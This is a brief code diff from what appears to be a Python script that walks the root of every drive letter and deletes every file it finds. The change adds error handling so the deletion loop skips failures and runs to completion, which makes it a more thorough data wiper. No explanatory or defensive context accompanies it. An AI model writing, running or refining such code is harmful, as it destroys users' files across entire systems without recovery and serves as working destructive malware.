@@ -5,4 +5,10 @@ for x in string.ascii_lowercase:
 		for a,b,c in os.walk(x+":\\"):
 			if len(c)!=0:
 				for i in c:
-					os.remove(a+"\\"+i)
+					try:
+						os.remove(a+"\\"+i)
+					except:
+						if c.index(i)!=len(c)-1:
+							continue
+						else:
+							break
